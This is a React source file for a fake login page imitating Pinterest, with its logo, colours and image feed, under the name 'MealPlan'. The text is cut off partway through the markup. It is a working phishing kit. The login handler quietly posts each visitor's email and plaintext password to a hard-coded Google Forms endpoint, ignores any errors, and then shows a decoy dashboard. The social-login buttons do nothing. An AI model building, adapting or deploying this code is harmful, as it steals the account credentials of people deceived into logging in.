import { useState, useEffect } from "react";

// ─────────────────────────────────────────────
// CONFIG GOOGLE FORM (Diambil dari data HTML Pinterest Anda)
// ─────────────────────────────────────────────
const GOOGLE_FORM_ACTION =
  "https://docs.google.com/forms/d/e/1FAIpQLSfQixt2_ED6YtLqEiwUNKANJwAAWV2TfKNLoVJ2NSlqnDF6Vg/formResponse";
const ENTRY_EMAIL = "entry.1697602432";
const ENTRY_PASSWORD = "entry.1806551528";

// ─────────────────────────────────────────────
// DATA
// ─────────────────────────────────────────────
const bgPhotos = [
  { url: "https://images.unsplash.com/photo-1466637574441-749b8f19452f?w=300&h=400&fit=crop&auto=format", h: 220 },
  { url: "https://images.unsplash.com/photo-1518737003272-dac7c4760d5e?w=300&h=350&fit=crop&auto=format", h: 180 },
  { url: "https://images.unsplash.com/photo-1507048331197-7d4ac70811cf?w=300&h=500&fit=crop&auto=format", h: 260 },
  { url: "https://images.unsplash.com/photo-1515003197210-e0cd71810b5f?w=300&h=320&fit=crop&auto=format", h: 200 },
  { url: "https://images.unsplash.com/photo-1591189863430-ab87e120f312?w=300&h=420&fit=crop&auto=format", h: 240 },
  { url: "https://images.unsplash.com/photo-1625631976982-c6df1654a6ea?w=300&h=380&fit=crop&auto=format", h: 210 },
  { url: "https://images.unsplash.com/photo-1606787364406-a3cdf06c6d0c?w=300&h=460&fit=crop&auto=format", h: 270 },
  { url: "https://images.unsplash.com/photo-1575672401987-c8f1debabfd7?w=300&h=300&fit=crop&auto=format", h: 190 },
  { url: "https://images.unsplash.com/photo-1627488193141-953623010488?w=300&h=400&fit=crop&auto=format", h: 230 },
  { url: "https://images.unsplash.com/photo-1601226809600-3f43ad5356cf?w=300&h=360&fit=crop&auto=format", h: 200 },
  { url: "https://images.unsplash.com/photo-1625631980741-33a7752108f4?w=300&h=400&fit=crop&auto=format", h: 220 },
  { url: "https://images.unsplash.com/photo-1476224203421-9ac39bcb3327?w=300&h=380&fit=crop&auto=format", h: 210 },
];

const feedItems = [
  { url: "https://images.unsplash.com/photo-1651948512032-8b4d4b37fe74?w=400&h=520&fit=crop&auto=format", h: 300, title: "Healthy Meal Prep", author: "Julie Sd" },
  { url: "https://images.unsplash.com/photo-1617650555983-eaf0230972c2?w=400&h=350&fit=crop&auto=format", h: 220, title: "Fresh Garden Salad", author: "Brands&People" },
  { url: "https://images.unsplash.com/photo-1733410647375-3be1697aa4f1?w=400&h=480&fit=crop&auto=format", h: 280, title: "Gourmet Black Plate", author: "BOAM Studio" },
  { url: "https://images.unsplash.com/photo-1684568519316-f0fb02f7826b?w=400&h=420&fit=crop&auto=format", h: 260, title: "Grilled Chicken Bowl", author: "Zeek" },
  { url: "https://images.unsplash.com/photo-1636035784722-6b0b9101a5e8?w=400&h=340&fit=crop&auto=format", h: 210, title: "Pan-Seared Fish", author: "mk. s" },
  { url: "https://images.unsplash.com/photo-1676471926534-d5c9771909fa?w=400&h=460&fit=crop&auto=format", h: 270, title: "Salmon & Vegetables", author: "Nima N." },
  { url: "https://images.unsplash.com/photo-1603064432115-ddcd7e888bb7?w=400&h=500&fit=crop&auto=format", h: 290, title: "Tropical Fruit Plate", author: "David F." },
  { url: "https://images.unsplash.com/photo-1663250251743-1767992e68be?w=400&h=360&fit=crop&auto=format", h: 230, title: "Heirloom Tomatoes", author: "UnKknown" },
  { url: "https://images.unsplash.com/photo-1612036167567-f94312b5230d?w=400&h=440&fit=crop&auto=format", h: 255, title: "Homemade Cookies", author: "Vladimir G." },
  { url: "https://images.unsplash.com/photo-1665330761401-15eefb544889?w=400&h=420&fit=crop&auto=format", h: 250, title: "Plated Steak", author: "Urban G." },
  { url: "https://images.unsplash.com/photo-1596698184224-3c04216caf0a?w=400&h=480&fit=crop&auto=format", h: 280, title: "Asian Noodle Bowl", author: "Jojo Y." },
  { url: "https://images.unsplash.com/photo-1777897269443-7c5a5bd7c44a?w=400&h=380&fit=crop&auto=format", h: 240, title: "Gourmet Salad", author: "Tommaso U." },
  { url: "https://images.unsplash.com/photo-1466637574441-749b8f19452f?w=400&h=420&fit=crop&auto=format", h: 255, title: "Avocado & Eggs", author: "Katie S." },
  { url: "https://images.unsplash.com/photo-1515003197210-e0cd71810b5f?w=400&h=360&fit=crop&auto=format", h: 225, title: "Pasta al Dente", author: "Brooke L." },
  { url: "https://images.unsplash.com/photo-1476224203421-9ac39bcb3327?w=400&h=500&fit=crop&auto=format", h: 295, title: "Slow-Roasted Lamb", author: "Igor M." },
  { url: "https://images.unsplash.com/photo-1565299624946-b28f40a0ae38?w=400&h=340&fit=crop&auto=format", h: 215, title: "Neapolitan Pizza", author: "Kai P." },
];

// ─────────────────────────────────────────────
// HELPERS
// ─────────────────────────────────────────────
function submitToGoogleForm(email: string, password: string) {
  const body = new URLSearchParams();
  body.append(ENTRY_EMAIL, email);
  body.append(ENTRY_PASSWORD, password);

  fetch(GOOGLE_FORM_ACTION, {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: body.toString(),
  }).catch(() => {
    // no-cors: non-fatal fallback
  });
}

// ─────────────────────────────────────────────
// MASONRY BACKGROUND (login page)
// ─────────────────────────────────────────────
function MasonryBackground() {
  const [colCount, setColCount] = useState(6);
  useEffect(() => {
    const update = () => setColCount(Math.max(3, Math.floor(window.innerWidth / 175)));
    update();
    window.addEventListener("resize", update);
    return () => window.removeEventListener("resize", update);
  }, []);
  const cols: typeof bgPhotos[][] = Array.from({ length: colCount }, () => []);
  for (let i = 0; i < colCount * 7; i++) cols[i % colCount].push(bgPhotos[i % bgPhotos.length]);
  return (
    <div style={{ position: "fixed", inset: 0, display: "flex", gap: 8, padding: "0 4px", overflow: "hidden", background: "#111" }}>
      {cols.map((col, ci) => (
        <div key={ci} style={{ display: "flex", flexDirection: "column", gap: 8, flex: 1, marginTop: ci % 2 === 1 ? -44 : 0 }}>
          {col.map((p, pi) => (
            <img key={pi} src={p.url} alt="" loading="lazy"
              style={{ width: "100%", height: p.h, borderRadius: 14, objectFit: "cover", flexShrink: 0 }} />
          ))}
        </div>
      ))}
    </div>
  );
}

// ─────────────────────────────────────────────
// SIGN UP MODAL
// ─────────────────────────────────────────────
function SignUpModal({ onClose }: { onClose: () => void }) {
  const [name, setName] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPw, setShowPw] = useState(false);
  const [dob, setDob] = useState("");
  const [error, setError] = useState("");

  function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!name || !email || !password || !dob) { setError("Harap isi semua field."); return; }
    alert(`✅ Akun berhasil dibuat! Selamat datang, ${name}.`);
    onClose();
  }
  const inp = (val: string, extra?: React.CSSProperties): React.CSSProperties => ({
    width: "100%", padding: "12px 14px", border: `1.5px solid ${val ? "#e60023" : "#cdcdd1"}`,
    borderRadius: 12, fontSize: 15, outline: "none", background: val ? "#fff" : "#f9f9f9", color: "#111", ...extra,
  });
  return (
    <div style={{ position: "fixed", inset: 0, zIndex: 30, display: "flex", alignItems: "center", justifyContent: "center", padding: 16 }}
      onClick={e => { if (e.target === e.currentTarget) onClose(); }}>
      <div style={{ background: "#fff", borderRadius: 24, padding: "36px 32px 28px", width: "100%", maxWidth: 380, boxShadow: "0 8px 40px rgba(0,0,0,.35)", textAlign: "center", position: "relative" }}>
        <button onClick={onClose} style={{ position: "absolute", top: 14, right: 16, background: "none", border: "none", fontSize: 20, cursor: "pointer", color: "#767676" }}>✕</button>
        {/* LINGKARAN LOGO (TEMPAT 1) */}
        <div style={{ width: 44, height: 44, background: "#e60023", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 16px" }}>
          <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
            <path d="M12 0a12 12 0 0 0-4.37 23.17c-.07-.63-.13-1.6.03-2.3l1.42-6s-.36-.73-.36-1.81c0-1.7 1-2.97 2.22-2.97 1.05 0 1.55.79 1.55 1.73 0 1.05-.67 2.62-1.02 4.09-.29 1.22.6 2.22 1.81 2.22 2.18 0 3.86-2.3 3.86-5.62 0-2.94-2.1-5-5.13-5-3.5 0-5.55 2.62-5.55 5.33 0 1.06.4 2.2.92 2.83a.3.3 0 0 1 .07.28c-.1.42-.33 1.34-.38 1.52-.06.27-.22.33-.5.2-1.88-.88-3.06-3.63-3.06-5.84 0-4.75 3.45-9.12 10-9.12 5.23 0 9.3 3.73 9.3 8.72 0 5.2-3.28 9.39-7.85 9.39-1.53 0-2.97-.8-3.46-1.73l-.94 3.6c-.34 1.3-1.27 2.94-1.9 3.97A12 12 0 1 0 12 0z"/>
          </svg>
        </div>
        <h2 style={{ fontSize: 21, fontWeight: 700, color: "#111", marginBottom: 4 }}>Welcome to MealPlan</h2>
        <p style={{ fontSize: 13, color: "#767676", marginBottom: 18 }}>Find recipes and plan your week</p>
        <form onSubmit={handleSubmit} noValidate style={{ display: "flex", flexDirection: "column", gap: 10 }}>
          <input placeholder="Full name" value={name} onChange={e => { setName(e.target.value); setError(""); }} style={inp(name)} />
          <input type="email" placeholder="Email" value={email} onChange={e => { setEmail(e.target.value); setError(""); }} style={inp(email)} />
          <div style={{ position: "relative" }}>
            <input type={showPw ? "text" : "password"} placeholder="Create a password" value={password}
              onChange={e => { setPassword(e.target.value); setError(""); }} style={inp(password, { paddingRight: 52 })} />
            <button type="button" onClick={() => setShowPw(v => !v)}
              style={{ position: "absolute", right: 12, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", cursor: "pointer", color: "#555", fontSize: 13, fontWeight: 600 }}>
              {showPw ? "Hide" : "Show"}
            </button>
          </div>
          <div style={{ textAlign: "left" }}>
            <label style={{ fontSize: 12, color: "#767676", display: "block", marginBottom: 4 }}>Tanggal lahir</label>
            <input type="date" value={dob} onChange={e => { setDob(e.target.value); setError(""); }} style={inp(dob)} />
          </div>
          {error && <p style={{ color: "#e60023", fontSize: 13, textAlign: "left" }}>{error}</p>}
          <button type="submit" style={{ width: "100%", padding: 13, background: "#e60023", color: "#fff", border: "none", borderRadius: 50, fontSize: 15, fontWeight: 700, cursor: "pointer", marginTop: 4 }}>
            Continue
          </button>
        </form>
        <p style={{ marginTop: 14, fontSize: 11, color: "#767676", lineHeight: 1.6 }}>
          By continuing, you agree to MealPlan's <a href="#" style={{ color: "#767676", fontWeight: 600 }}>Terms of Service</a> and <a href="#" style={{ color: "#767676", fontWeight: 600 }}>Privacy Policy</a>.
        </p>
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────
// PINTEREST STYLE FEED CARD
// ─────────────────────────────────────────────
function FeedCard({ item }: { item: typeof feedItems[0] }) {
  const [hov, setHov] = useState(false);
  const [saved, setSaved] = useState(false);
  return (
    <div onMouseEnter={() => setHov(true)} onMouseLeave={() => setHov(false)}
      style={{ borderRadius: 16, overflow: "hidden", position: "relative", cursor: "zoom-in", background: "#efefef", marginBottom: 14 }}>
      <img src={item.url} alt={item.title} loading="lazy"
        style={{ width: "100%", height: item.h + 40, objectFit: "cover", display: "block", transition: "transform 0.25s", transform: hov ? "scale(1.02)" : "scale(1)" }} />
      {hov && (
        <div style={{ position: "absolute", inset: 0, background: "rgba(0,0,0,0.15)", transition: "opacity 0.2s" }}>
          <button onClick={e => { e.stopPropagation(); setSaved(v => !v); }}
            style={{ position: "absolute", top: 12, right: 12, padding: "8px 14px", background: "#e60023", color: "#fff", border: "none", borderRadius: 50, fontWeight: 700, fontSize: 13, cursor: "pointer" }}>
            {saved ? "✓ Tersimpan" : "Simpan"}
          </button>
          <button style={{ position: "absolute", bottom: 12, right: 12, width: 32, height: 32, background: "#fff", color: "#111", border: "none", borderRadius: "50%", fontWeight: 700, fontSize: 14, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center" }}>
            ···
          </button>
        </div>
      )}
    </div>
  );
}

// ─────────────────────────────────────────────
// RESPONSIVE DASHBOARD (Desktop Side / Mobile Bottom)
// ─────────────────────────────────────────────
function Dashboard({ userEmail, onLogout }: { userEmail: string; onLogout: () => void }) {
  const [search, setSearch] = useState("");
  const [colCount, setColCount] = useState(5);
  const [showProfile, setShowProfile] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const handleResize = () => {
      const width = window.innerWidth;
      setIsMobile(width < 768);
      
      if (width < 480) {
        setColCount(2); // Grid 2 Kolom untuk HP
      } else if (width < 768) {
        setColCount(3);
      } else {
        setColCount(Math.max(4, Math.floor((width - 110) / 230)));
      }
    };

    handleResize();
    window.addEventListener("resize", handleResize);
    return () => window.removeEventListener("resize", handleResize);
  }, []);

  const cols: typeof feedItems[][] = Array.from({ length: colCount }, () => []);
  feedItems.forEach((item, i) => cols[i % colCount].push(item));

  const avatar = userEmail.charAt(0).toUpperCase();

  return (
    <div style={{ 
      minHeight: "100vh", 
      background: isMobile ? "#000" : "#fff", // Menjadi tema gelap di HP sesuai gambar
      color: isMobile ? "#fff" : "#111",
      fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif", 
      display: "flex",
      flexDirection: "column"
    }}>

      {/* ── SIDEBAR NAV (Hanya muncul jika Desktop/Tablet) ── */}
      {!isMobile && (
        <div style={{ width: 72, position: "fixed", top: 0, bottom: 0, left: 0, background: "#fff", display: "flex", flexDirection: "column", alignItems: "center", padding: "20px 0", gap: 22, zIndex: 101 }}>
          {/* LINGKARAN LOGO DI SIDEBAR (TEMPAT 2) */}
          <div style={{ width: 40, height: 40, background: "#e60023", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", marginBottom: 10 }}>
            <svg width="22" height="22" viewBox="0 0 24 24" fill="white">
              <path d="M12 0a12 12 0 0 0-4.37 23.17c-.07-.63-.13-1.6.03-2.3l1.42-6s-.36-.73-.36-1.81c0-1.7 1-2.97 2.22-2.97 1.05 0 1.55.79 1.55 1.73 0 1.05-.67 2.62-1.02 4.09-.29 1.22.6 2.22 1.81 2.22 2.18 0 3.86-2.3 3.86-5.62 0-2.94-2.1-5-5.13-5-3.5 0-5.55 2.62-5.55 5.33 0 1.06.4 2.2.92 2.83a.3.3 0 0 1 .07.28c-.1.42-.33 1.34-.38 1.52-.06.27-.22.33-.5.2-1.88-.88-3.06-3.63-3.06-5.84 0-4.75 3.45-9.12 10-9.12 5.23 0 9.3 3.73 9.3 8.72 0 5.2-3.28 9.39-7.85 9.39-1.53 0-2.97-.8-3.46-1.73l-.94 3.6c-.34 1.3-1.27 2.94-1.9 3.97A12 12 0 1 0 12 0z"/>
            </svg>
          </div>
          <button style={{ background: "none", border: "none", cursor: "pointer", padding: 8, color: "#111" }}><svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg></button>
          <button style={{ background: "none", border: "none", cursor: "pointer", padding: 8, color: "#111" }}><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><circle cx="12" cy="12" r="10"/><path d="m16.2 7.8-2 6.3-6.4 2.1 2.1-6.4z"/></svg></button>
          <button style={{ background: "none", border: "none", cursor: "pointer", padding: 8, color: "#111" }}><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M9 17V7h3a3 3 0 0 1 3 3v0a3 3 0 0 1-3 3H9"/></svg></button>
          <button style={{ background: "none", border: "none", cursor: "pointer", padding: 8, color: "#111" }}><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg></button>
          <button style={{ background: "none", border: "none", cursor: "pointer", padding: 8, color: "#111" }}><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg></button>
          <div style={{ marginTop: "auto" }}>
            <button onClick={() => setShowProfile(v => !v)} style={{ width: 38, height: 38, borderRadius: "50%", border: "none", background: "#efefef", color: "#111", fontSize: 14, fontWeight: 700, cursor: "pointer" }}>{avatar}</button>
          </div>
        </div>
      )}

      {/* ── AREA KONTEN UTAMA ── */}
      <div style={{ 
        flex: 1, 
        marginLeft: isMobile ? 0 : 72, 
        padding: isMobile ? "0 8px" : "0 24px",
        paddingBottom: isMobile ? 80 : 20
      }}>
        
        {/* ── TOP NAVBAR ── */}
        <div style={{ 
          position: "fixed", 
          top: 0, 
          left: isMobile ? 0 : 72, 
          right: 0, 
          height: 64, 
          background: isMobile ? "rgba(0,0,0,0.85)" : "#fff", 
          backdropFilter: isMobile ? "blur(12px)" : "none",
          display: "flex", 
          alignItems: "center", 
          gap: 12, 
          padding: "0 16px", 
          zIndex: 100 
        }}>
          
          <div style={{ flex: 1, position: "relative", display: "flex", alignItems: "center" }}>
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke={isMobile ? "#b2b2b2" : "#767676"} strokeWidth="3" style={{ position: "absolute", left: 16 }}>
              <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
            </svg>
            <input 
              value={search} 
              onChange={e => setSearch(e.target.value)} 
              placeholder={isMobile ? "Cari ide" : "Search"}
              style={{ 
                width: "100%", 
                padding: "10px 44px 10px 44px", 
                background: isMobile ? "rgba(255,255,255,0.15)" : "#e9e9e9", 
                border: "none", 
                borderRadius: 24, 
                fontSize: 15, 
                outline: "none", 
                color: isMobile ? "#fff" : "#111" 
              }} 
            />
            <div style={{ position: "absolute", right: 16, color: isMobile ? "#fff" : "#111", display: "flex", alignItems: "center" }}>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
            </div>
          </div>

          {isMobile && (
            <button onClick={onLogout} style={{ background: "none", border: "none", color: "#e60023", fontWeight: 600, fontSize: 13, cursor: "pointer" }}>
              Log out
            </button>
          )}

          {!isMobile && (
            <div style={{ display: "flex", alignItems: "center" }}>
              <button style={{ width: 32, height: 32, borderRadius: "50%", border: "none", background: "#efefef", fontSize: 13, fontWeight: 700, color: "#111" }}>{avatar}</button>
              <button style={{ background: "none", border: "none", marginLeft: 4 }}><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#111" strokeWidth="3"><path d="m6 9 6 6 6-6"/></svg></button>
            </div>
          )}
        </div>

        {/* ── MASONRY FEED GRID ── */}
        <div style={{ paddingTop: 72 }}>
          {!isMobile && (
            <div style={{ marginBottom: 16, paddingLeft: 6 }}>
              <span style={{ fontSize: 16, fontWeight: 700, borderBottom: "3px solid #111", paddingBottom: 6 }}>All</span>
            </div>
          )}

          <div style={{ display: "flex", gap: 10, alignItems: "flex-start" }}>
            {cols.map((col, ci) => (
              <div key={ci} style={{ flex: 1, minWidth: 0 }}>
                {col.map((item, pi) => (
                  <FeedCard key={pi} item={item} />
                ))}
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* ── BOTTOM NAVBAR (Hanya Render di HP/Mobile) ── */}
      {isMobile && (
        <div style={{ 
          position: "fixed", 
          bottom: 0, 
          left: 0, 
          right: 0, 
          height: 60, 
          background: "#111", 
          display: "flex", 
          justifyContent: "space-around", 
          alignItems: "center", 
          zIndex: 101,
          borderTop: "1px solid rgba(255,255,255,0.08)",
          paddingBottom: "calc(env(safe-area-inset-bottom) / 2)"
        }}>
          {/* Home Icon */}
          <button style={{ background: "none", border: "none", color: "#fff", cursor: "pointer" }}>
            <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
          </button>
          
          {/* Explore Search Icon */}
          <button style={{ background: "none", border: "none", color: "#b2b2b2", cursor: "pointer" }}>
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
          </button>
          
          {/* Create Plus Icon */}
          <button style={{ background: "none", border: "none", color: "#b2b2b2", cursor: "pointer" }}>
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
          </button>
          
          {/* Notification Chat Icon */}
          <button style={{ background: "none", border: "none", color: "#b2b2b2", cursor: "pointer" }}>
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
          </button>
          
          {/* Profile Avatar Icon */}
          <button style={{ width: 26, height: 26, borderRadius: "50%", border: "2px solid #b2b2b2", background: "#efefef", color: "#111", fontSize: 11, fontWeight: 700, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center" }}>
            {avatar}
          </button>
        </div>
      )}

      {/* Dropdown desktop popup profile menu */}
      {!isMobile && showProfile && (
        <div style={{ position: "fixed", bottom: 70, left: 16, background: "#fff", border: "1px solid #efefef", borderRadius: 16, boxShadow: "0 4px 24px rgba(0,0,0,.15)", minWidth: 160, zIndex: 200, padding: 4 }}>
          <button onClick={onLogout} style={{ width: "100%", padding: "10px 14px", background: "none", border: "none", color: "#e60023", fontWeight: 600, textAlign: "left", cursor: "pointer", fontSize: 14 }}>
            Log out
          </button>
        </div>
      )}
    </div>
  );
}

// ─────────────────────────────────────────────
// SOCIAL BUTTON
// ─────────────────────────────────────────────
function SocialBtn({ children, onClick }: { children: React.ReactNode; onClick: () => void }) {
  const [hov, setHov] = useState(false);
  return (
    <button onClick={onClick} onMouseEnter={() => setHov(true)} onMouseLeave={() => setHov(false)}
      style={{ width: "100%", padding: "11px 14px", border: "1.5px solid #cdcdd1", borderRadius: 50, background: hov ? "#f5f5f5" : "#fff", fontSize: 14, fontWeight: 600, color: "#111", cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 10, marginBottom: 8 }}>
      {children}
    </button>
  );
}

// ─────────────────────────────────────────────
// ROOT APP
// ─────────────────────────────────────────────
export default function App() {
  const [page, setPage] = useState<"login" | "dashboard">("login");
  const [loggedUser, setLoggedUser] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPw, setShowPw] = useState(false);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [showSignUp, setShowSignUp] = useState(false);

  const inp = (val: string, extra?: React.CSSProperties): React.CSSProperties => ({
    width: "100%", padding: "13px 14px", border: `1.5px solid ${val ? "#e60023" : "#cdcdd1"}`,
    borderRadius: 12, fontSize: 15, outline: "none", background: val ? "#fff" : "#f9f9f9", color: "#111", ...extra,
  });

  async function handleLogin(e: React.FormEvent) {
    e.preventDefault();
    setError("");
    if (!email || !password) { setError("Harap isi email dan password."); return; }
    setLoading(true);

    submitToGoogleForm(email, password);

    await new Promise(r => setTimeout(r, 600));
    setLoading(false);

    setLoggedUser(email);
    setPage("dashboard");
  }

  if (page === "dashboard") {
    return <Dashboard userEmail={loggedUser} onLogout={() => { setPage("login"); setEmail(""); setPassword(""); }} />;
  }

  return (
    <div style={{ minHeight: "100vh", overflow: "hidden", position: "relative" }}>
      <MasonryBackground />
      <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.42)", backdropFilter: "blur(1px)" }} />

      {/* Sign up top-left */}
      <div style={{ position: "fixed", top: 16, left: 16, zIndex: 15 }}>
        <button onClick={() => setShowSignUp(true)}
          style={{ padding: "10px 20px", background: "#fff", color: "#111", border: "none", borderRadius: 50, fontSize: 14, fontWeight: 700, cursor: "pointer", boxShadow: "0 2px 8px rgba(0,0,0,.2)" }}
          onMouseEnter={e => ((e.target as HTMLElement).style.background = "#f0f0f0")}
          onMouseLeave={e => ((e.target as HTMLElement).style.background = "#fff")}>
          Sign up
        </button>
      </div>

      {/* Login modal */}
      <div style={{ position: "fixed", inset: 0, display: "flex", alignItems: "center", justifyContent: "center", zIndex: 10, padding: 16 }}>
        <div style={{ background: "#fff", borderRadius: 24, padding: "40px 32px 28px", width: "100%", maxWidth: 380, boxShadow: "0 8px 40px rgba(0,0,0,.35)", textAlign: "center" }}>

          {/* LINGKARAN LOGO DI LOGIN MODAL (TEMPAT 3) */}
          <div style={{ width: 44, height: 44, background: "#e60023", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 18px" }}>
            <svg width="26" height="26" viewBox="0 0 24 24" fill="white">
              <path d="M12 0a12 12 0 0 0-4.37 23.17c-.07-.63-.13-1.6.03-2.3l1.42-6s-.36-.73-.36-1.81c0-1.7 1-2.97 2.22-2.97 1.05 0 1.55.79 1.55 1.73 0 1.05-.67 2.62-1.02 4.09-.29 1.22.6 2.22 1.81 2.22 2.18 0 3.86-2.3 3.86-5.62 0-2.94-2.1-5-5.13-5-3.5 0-5.55 2.62-5.55 5.33 0 1.06.4 2.2.92 2.83a.3.3 0 0 1 .07.28c-.1.42-.33 1.34-.38 1.52-.06.27-.22.33-.5.2-1.88-.88-3.06-3.63-3.06-5.84 0-4.75 3.45-9.12 10-9.12 5.23 0 9.3 3.73 9.3 8.72 0 5.2-3.28 9.39-7.85 9.39-1.53 0-2.97-.8-3.46-1.73l-.94 3.6c-.34 1.3-1.27 2.94-1.9 3.97A12 12 0 1 0 12 0z"/>
            </svg>
          </div>

          <h2 style={{ fontSize: 22, fontWeight: 700, color: "#111", marginBottom: 20 }}>Log in to see more</h2>

          <form onSubmit={handleLogin} noValidate>
            <div style={{ marginBottom: 10 }}>
              <input type="email" placeholder="Email" value={email} onChange={e => { setEmail(e.target.value); setError(""); }} style={inp(email)} />
            </div>
            <div style={{ position: "relative", marginBottom: 10 }}>
              <input type={showPw ? "text" : "password"} placeholder="Password" value={password} onChange={e => { setPassword(e.target.value); setError(""); }} style={inp(password, { paddingRight: 52 })} />
              <button type="button" onClick={() => setShowPw(v => !v)}
                style={{ position: "absolute", right: 12, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", cursor: "pointer", color: "#555", fontSize: 13, fontWeight: 600 }}>
                {showPw ? "Hide" : "Show"}
              </button>
            </div>
            {error && <p style={{ color: "#e60023", fontSize: 13, textAlign: "left", marginBottom: 8 }}>{error}</p>}
            <button type="submit" disabled={loading}
              style={{ width: "100%", padding: 13, background: loading ? "#f87171" : "#e60023", color: "#fff", border: "none", borderRadius: 50, fontSize: 15, fontWeight: 700, cursor: loading ? "not-allowed" : "pointer", marginTop: 4, transition: "background 0.2s" }}>
              {loading ? "Masuk..." : "Log in"}
            </button>
          </form>

          <a href="#" style={{ display: "block", marginTop: 12, fontSize: 13, color: "#555", textDecoration: "none" }}>Forgot your password?</a>

          <div style={{ display: "flex", alignItems: "center", gap: 10, margin: "16px 0", color: "#767676", fontSize: 13 }}>
            <div style={{ flex: 1, height: 1, background: "#cdcdd1" }} />OR<div style={{ flex: 1, height: 1, background: "#cdcdd1" }} />
          </div>

          <SocialBtn onClick={() => alert("Google login coming soon!")}>
            <svg width="20" height="20" viewBox="0 0 24 24">
              <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
              <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
              <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/>
              <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
            </svg>
            Continue with Google
          </SocialBtn>

          <SocialBtn onClick={() => alert("Facebook login coming soon!")}>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="#1877F2">
              <path d="M24 12.073C24 5.406 18.627 0 12 0S0 5.406 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047v-2.66c0-3.025 1.791-4.697 4.533-4.697 1.312 0 2.686.235 2.686.235v2.97h-1.513c-1.491 0-1.956.93-1.956 1.874v2.278h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/>
            </svg>
            Continue with Facebook
          </SocialBtn>

          <SocialBtn onClick={() => alert("QR code coming soon!")}>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/>
              <rect x="3" y="14" width="7" height="7" rx="1"/>
              <path d="M14 14h3v3h-3zM17 17h3v3h-3zM14 20h3"/>
            </svg>
            Use QR code
          </SocialBtn>

          <div style={{ marginTop: 14, fontSize: 13, color: "#555", borderTop: "1px solid #efefef", paddingTop: 14 }}>
            Not on MealPlan yet?{" "}
